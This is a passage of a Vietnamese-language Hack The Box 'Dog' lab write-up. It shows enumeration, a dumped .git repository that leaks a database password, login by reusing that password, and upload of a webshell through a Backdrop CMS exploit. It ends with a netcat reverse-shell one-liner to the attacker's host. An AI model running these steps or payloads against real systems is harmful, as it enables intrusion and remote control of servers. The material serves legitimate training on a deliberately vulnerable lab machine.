+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">22</span> disallowed entries
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /core/ /profiles/ /README.md /web.config /admin
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /comment/reply /filter/tips /node/add /search /user/register
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /user/password /user/login /user/logout /?q<span class="o">=</span>admin /?q<span class="o">=</span>comment/reply
+</span></span><span class="line"><span class="cl"><span class="p">|</span> /?q<span class="o">=</span>filter/tips /?q<span class="o">=</span>node/add /?q<span class="o">=</span>search /?q<span class="o">=</span>user/password
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_/?q<span class="o">=</span>user/register /?q<span class="o">=</span>user/login /?q<span class="o">=</span>user/logout
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: Backdrop CMS <span class="m">1</span> <span class="o">(</span>https://backdropcms.org<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Home <span class="p">|</span> Dog
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+
+<h2 class="relative group">Enumeration and Gaining access
+    <div id="enumeration-and-gaining-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#enumeration-and-gaining-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+
+<h3 class="relative group">Vhost, directories
+    <div id="vhost-directories" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#vhost-directories" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Tìm directories</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">301</span>   309B   http://10.10.11.58/.git    -&gt; REDIRECTS TO: http://10.10.11.58/.git/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>    73B   http://10.10.11.58/.git/description
+</span></span><span class="line"><span class="cl"><span class="m">200</span>    95B   http://10.10.11.58/.git/COMMIT_EDITMSG
+</span></span><span class="line"><span class="cl"><span class="m">200</span>    23B   http://10.10.11.58/.git/HEAD
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   604B   http://10.10.11.58/.git/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   409B   http://10.10.11.58/.git/branches/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>    92B   http://10.10.11.58/.git/config
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   240B   http://10.10.11.58/.git/info/exclude
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   476B   http://10.10.11.58/.git/logs/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   650B   http://10.10.11.58/.git/hooks/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   455B   http://10.10.11.58/.git/info/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   230B   http://10.10.11.58/.git/logs/HEAD
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   319B   http://10.10.11.58/.git/logs/refs    -&gt; REDIRECTS TO: http://10.10.11.58/.git/logs/refs/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   325B   http://10.10.11.58/.git/logs/refs/heads    -&gt; REDIRECTS TO: http://10.10.11.58/.git/logs/refs/heads/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   320B   http://10.10.11.58/.git/refs/heads    -&gt; REDIRECTS TO: http://10.10.11.58/.git/refs/heads/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   230B   http://10.10.11.58/.git/logs/refs/heads/master
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   461B   http://10.10.11.58/.git/refs/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>    41B   http://10.10.11.58/.git/refs/heads/master
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   319B   http://10.10.11.58/.git/refs/tags    -&gt; REDIRECTS TO: http://10.10.11.58/.git/refs/tags/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   337KB  http://10.10.11.58/.git/index
+</span></span><span class="line"><span class="cl"><span class="m">200</span>     2KB  http://10.10.11.58/.git/objects/
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.ht_wsr.txt
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccess.bak1
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccess.sample
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccess.orig
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccess.save
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccess_orig
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccess_extra
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccess_sc
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccessOLD
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccessOLD2
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htaccessBAK
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.html
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htm
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htpasswd_test
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.httr-oauth
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.htpasswds
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/.php
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   309B   http://10.10.11.58/core    -&gt; REDIRECTS TO: http://10.10.11.58/core/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   310B   http://10.10.11.58/files    -&gt; REDIRECTS TO: http://10.10.11.58/files/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   586B   http://10.10.11.58/files/
+</span></span><span class="line"><span class="cl"><span class="m">404</span>     2KB  http://10.10.11.58/index.php/login/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   456B   http://10.10.11.58/layouts/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>     7KB  http://10.10.11.58/LICENSE.txt
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   312B   http://10.10.11.58/modules    -&gt; REDIRECTS TO: http://10.10.11.58/modules/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   399B   http://10.10.11.58/modules/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>     5KB  http://10.10.11.58/README.md
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   528B   http://10.10.11.58/robots.txt
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/server-status/
+</span></span><span class="line"><span class="cl"><span class="m">403</span>   276B   http://10.10.11.58/server-status
+</span></span><span class="line"><span class="cl"><span class="m">200</span>     0B   http://10.10.11.58/settings.php
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   310B   http://10.10.11.58/sites    -&gt; REDIRECTS TO: http://10.10.11.58/sites/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>   311B   http://10.10.11.58/themes    -&gt; REDIRECTS TO: http://10.10.11.58/themes/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>   454B   http://10.10.11.58/themes/</span></span></code></pre></div></div>
+<p>Tìm vhost, tuy nhiên tôi không tìm thấy vhost nào. Quay trở lại các directories thì tôi có git.</p>
+
+<h3 class="relative group">.git
+    <div id="git" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#git" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Sử dụng <a href="https://github.com/arthaud/git-dumper"  target="_blank" rel="noreferrer">git-dumper</a> để dump được repo này ra</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ git-dumper http://10.10.11.58/.git/ dumped_repo
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Testing http://10.10.11.58/.git/HEAD <span class="o">[</span>200<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Testing http://10.10.11.58/.git/ <span class="o">[</span>200<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching .git recursively
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching http://10.10.11.58/.git/ <span class="o">[</span>200<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching http://10.10.11.58/.gitignore <span class="o">[</span>404<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> http://10.10.11.58/.gitignore responded with status code <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching http://10.10.11.58/.git/objects/ <span class="o">[</span>200<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching http://10.10.11.58/.git/logs/ <span class="o">[</span>200<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.......
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching http://10.10.11.58/.git/objects/e6/d15eb7293e0fdbb869080b6b5ff42810df6726 <span class="o">[</span>200<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching http://10.10.11.58/.git/objects/e6/f614f30aa8fd1c3e1cc2e1983b4d30f16ea3cd <span class="o">[</span>200<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Fetching http://10.10.11.58/.git/objects/e6/fe4d122e7f434cffa1bede170208a54f526552 <span class="o">[</span>200<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Sanitizing .git/config
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Running git checkout .
+</span></span><span class="line"><span class="cl">Updated <span class="m">2873</span> paths from the index
+</span></span><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ ll dumped_repo
+</span></span><span class="line"><span class="cl">total 80K
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">9</span> neo neo 4.0K Apr <span class="m">14</span> 14:08 core
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">7</span> neo neo 4.0K Apr <span class="m">14</span> 14:08 files
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> neo neo  <span class="m">578</span> Apr <span class="m">14</span> 14:08 index.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> neo neo 4.0K Apr <span class="m">14</span> 14:08 layouts
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> neo neo  18K Apr <span class="m">14</span> 14:08 LICENSE.txt
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> neo neo 5.2K Apr <span class="m">14</span> 14:08 README.md
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> neo neo 1.2K Apr <span class="m">14</span> 14:08 robots.txt
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> neo neo  22K Apr <span class="m">14</span> 14:08 settings.php
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> neo neo 4.0K Apr <span class="m">14</span> 14:08 sites
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> neo neo 4.0K Apr <span class="m">14</span> 14:08 themes</span></span></code></pre></div></div>
+<p><code>settings.php</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ cat dumped_repo/settings.php
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">/**
+</span></span><span class="line"><span class="cl"> * @file
+</span></span><span class="line"><span class="cl"> * Main Backdrop CMS configuration file.
+</span></span><span class="line"><span class="cl"> */
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/**
+</span></span><span class="line"><span class="cl"> * Database configuration:
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * Most sites can configure their database by entering the connection string
+</span></span><span class="line"><span class="cl"> * below. If using primary/replica databases or multiple connections, see the
+</span></span><span class="line"><span class="cl"> * advanced database documentation at
+</span></span><span class="line"><span class="cl"> * https://api.backdropcms.org/database-configuration
+</span></span><span class="line"><span class="cl"> */
+</span></span><span class="line"><span class="cl"><span class="nv">$database</span> <span class="o">=</span> <span class="s1">&#39;mysql://root:BackDropJ*******DS2024@127.0.0.1/backdrop&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$database_prefix</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/**
+</span></span><span class="line"><span class="cl"> * Site configuration files location.</span></span></code></pre></div></div>
+<p>Vậy là ở đây tôi biết được server sử dụng mysql và có pass của root khi login mysql. Tuy nhiên chỉ là db trên local, không thể login từ bên ngoài do port 3306 không mở. Tôi sẽ lưu nó lại và tiếp tục đào sâu hơn và git repo này.</p>
+<p>Tìm kiếm các thông tin cơ bản như username, password, mysql, config.php, domain, &hellip; tôi tìm thấy 1 user</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ grep -rni <span class="s2">&#34;@dog.htb&#34;</span> ./dumped_repo
+</span></span><span class="line"><span class="cl">./dumped_repo/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:12:        <span class="s2">&#34;tiffany@dog.htb&#34;</span></span></span></code></pre></div></div>
+<p>Thử login ssh với thông tin đã thu thập được: <code>tiffany:BackDropJ2024DS2024</code> nhưng không có kết quả, vậy thì có 2 khả năng xảy ra ở đây:</p>
+<ul>
+<li>Password của user <code>tiffany</code> sai.</li>
+<li>Không tồn tại user <code>tiffany</code> trong máy chủ.</li>
+</ul>
+<p>Tuy nhiên thì tạm thời chưa có cách nào để check được 2 trường hợp này, brute-force chỉ là phương án cuối cùng.</p>
+
+<h3 class="relative group">Backdrop CMS
+    <div id="backdrop-cms" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#backdrop-cms" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>Tôi còn nguyên 1 trang web chưa check. Giờ là lúc vào xem nó có gì.</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="one"
+    width="1478"
+    height="848"
+    src="/ctf/hackthebox/dog/1_hu_3bd3960e5df9ee12.png"
+    srcset="/ctf/hackthebox/dog/1_hu_3bd3960e5df9ee12.png 800w, /ctf/hackthebox/dog/1_hu_60c97179bb0b129c.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/dog/1.png"></figure>
+<p>Nhìn một lượt thì tôi có thêm 2 author là <em>dogBackDropSystem</em> và <em>Anonymous</em>, đây cũng có thể là 2 user để login được vào trang web.</p>
+<p>Quay trở lại phần directories phía trên thì tôi có <code>/robots.txt</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># robots.txt</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This file is to prevent the crawling and indexing of certain parts</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># of your site by web crawlers and spiders run by sites like Yahoo!</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># and Google. By telling these &#34;robots&#34; where not to go on your site,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># you save bandwidth and server resources.</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># This file will be ignored unless it is at the root of your host:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Used:    http://example.com/robots.txt</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Ignored: http://example.com/site/robots.txt</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># For more information about the robots.txt standard, see:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># http://www.robotstxt.org/robotstxt.html</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># For syntax checking, see:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># http://www.robotstxt.org/checker.html</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User-agent: *
+</span></span><span class="line"><span class="cl">Crawl-delay: <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Directories</span>
+</span></span><span class="line"><span class="cl">Disallow: /core/
+</span></span><span class="line"><span class="cl">Disallow: /profiles/
+</span></span><span class="line"><span class="cl"><span class="c1"># Files</span>
+</span></span><span class="line"><span class="cl">Disallow: /README.md
+</span></span><span class="line"><span class="cl">Disallow: /web.config
+</span></span><span class="line"><span class="cl"><span class="c1"># Paths (clean URLs)</span>
+</span></span><span class="line"><span class="cl">Disallow: /admin
+</span></span><span class="line"><span class="cl">Disallow: /comment/reply
+</span></span><span class="line"><span class="cl">Disallow: /filter/tips
+</span></span><span class="line"><span class="cl">Disallow: /node/add
+</span></span><span class="line"><span class="cl">Disallow: /search
+</span></span><span class="line"><span class="cl">Disallow: /user/register
+</span></span><span class="line"><span class="cl">Disallow: /user/password
+</span></span><span class="line"><span class="cl">Disallow: /user/login
+</span></span><span class="line"><span class="cl">Disallow: /user/logout
+</span></span><span class="line"><span class="cl"><span class="c1"># Paths (no clean URLs)</span>
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>admin
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>comment/reply
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>filter/tips
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>node/add
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>search
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>user/password
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>user/register
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>user/login
+</span></span><span class="line"><span class="cl">Disallow: /?q<span class="o">=</span>user/logout</span></span></code></pre></div></div>
+<p>Tôi có cả phần login và register ở đây, nhưng không truy cập register để đăng ký tài khoản mới, nên tôi sẽ thử login với những gì tôi đang có.</p>
+<p>Sau khi thử các khả năng với các username:password đã có thì tôi đã login được với <code>tiffany:BackDropJ2024DS2024</code></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="two"
+    width="1878"
+    height="836"
+    src="/ctf/hackthebox/dog/2_hu_4f7ddd9a29aabc9a.png"
+    srcset="/ctf/hackthebox/dog/2_hu_4f7ddd9a29aabc9a.png 800w, /ctf/hackthebox/dog/2_hu_cebb222906d3324a.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/dog/2.png"></figure>
+<p>Xem Wappalyzer, tôi biết được web dùng Backdrop - 1 CMS được phát triển dựa trên Drupal. Tìm kiếm lỗ hổng của Backdrop 1 trên Exploit-DB, tôi tìm được <a href="https://www.exploit-db.com/exploits/52021"  target="_blank" rel="noreferrer">Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)</a></p>
+<p>Phân tích exploit này một chút, Backdrop cho phép người dùng admin upload module dạng .zip hoặc .tar.gz thông qua GUI <code>/admin/modules/install</code>. Exploit sẽ tạo 1 webshell php, nén nó dưới dạng zip và tải lên như 1 module giả. Cuối cùng truy cập webshell bằng đường dẫn <code>/modules/shell/shell.php</code></p>
+<p>Đầu tiên tạo file zip chưa webshell</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ python 52021.py http://10.10.11.58
+</span></span><span class="line"><span class="cl">Backdrop CMS 1.27.1 - Remote Command Execution Exploit
+</span></span><span class="line"><span class="cl">Evil module generating...
+</span></span><span class="line"><span class="cl">Evil module generated! shell.zip
+</span></span><span class="line"><span class="cl">Go to http://10.10.11.58/admin/modules/install and upload the shell.zip <span class="k">for</span> Manual Installation.
+</span></span><span class="line"><span class="cl">Your shell address: http://10.10.11.58/modules/shell/shell.php
+</span></span><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ ll
+</span></span><span class="line"><span class="cl">total 32K
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> neo neo 2.6K Apr <span class="m">13</span> 13:52 52021.py
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> neo neo 3.0K Apr <span class="m">13</span> 13:14 dirsearch.txt
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">8</span> neo neo 4.0K Apr <span class="m">14</span> 14:08 dumped_repo
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">7</span> neo neo 4.0K Apr <span class="m">13</span> 13:16 GitTools
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> neo neo 2.4K Apr <span class="m">13</span> 12:18 nmap
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> neo neo 4.0K Apr <span class="m">13</span> 13:13 reports
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> neo neo 4.0K Apr <span class="m">15</span> 15:58 shell
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> neo neo 1.1K Apr <span class="m">15</span> 15:58 shell.zip</span></span></code></pre></div></div>
+<p>Tiếp theo vào phần modules trên GUI để tải lên module</p>
+<p>Functionality -&gt; Install new modules -&gt; Manual installation</p>
+<p>Để tải lên được file zip, buộc phải chọn vào option 3: Upload a module, theme, or layout archive to install</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="three"
+    width="1155"
+    height="566"
+    src="/ctf/hackthebox/dog/3_hu_dbff213e8c24adc3.png"
+    srcset="/ctf/hackthebox/dog/3_hu_dbff213e8c24adc3.png 800w, /ctf/hackthebox/dog/3.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/dog/3.png"></figure>
+<p>Tuy nhiên để upload file thì cần chuyển nó từ .zip sang .tar.gz và cuối cùng chọn INSTALL</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ tar -czf shell.tar.gz shell/
+</span></span><span class="line"><span class="cl">neo@fs0c13ty ~/htb/machines/dog$ ll
+</span></span><span class="line"><span class="cl">total 36K
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> neo neo 2.6K Apr <span class="m">13</span> 13:52 52021.py
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> neo neo 3.0K Apr <span class="m">13</span> 13:14 dirsearch.txt
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">8</span> neo neo 4.0K Apr <span class="m">14</span> 14:08 dumped_repo
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">7</span> neo neo 4.0K Apr <span class="m">13</span> 13:16 GitTools
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> neo neo 2.4K Apr <span class="m">13</span> 12:18 nmap
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> neo neo 4.0K Apr <span class="m">13</span> 13:13 reports
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> neo neo 4.0K Apr <span class="m">15</span> 15:58 shell
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> neo neo  <span class="m">671</span> Apr <span class="m">15</span> 16:00 shell.tar.gz
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> neo neo 1.1K Apr <span class="m">15</span> 15:58 shell.zip</span></span></code></pre></div></div>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="four"
+    width="998"
+    height="455"
+    src="/ctf/hackthebox/dog/4_hu_278fed5e0da50652.png"
+    srcset="/ctf/hackthebox/dog/4_hu_278fed5e0da50652.png 800w, /ctf/hackthebox/dog/4.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/dog/4.png"></figure>
+<p>Truy cập lại vào link webshell như trong code exploit</p>
+<p><code>http://10.10.11.58/modules/shell/shell.php</code></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="five"
+    width="1020"
+    height="280"
+    src="/ctf/hackthebox/dog/5_hu_dfcfb94a2d1c591c.png"
+    srcset="/ctf/hackthebox/dog/5_hu_dfcfb94a2d1c591c.png 800w, /ctf/hackthebox/dog/5.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/dog/5.png"></figure>
+<p>Tôi sẽ thêm payload để lấy revershell</p>
+<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.135 9001 &gt;/tmp/f</code></p>
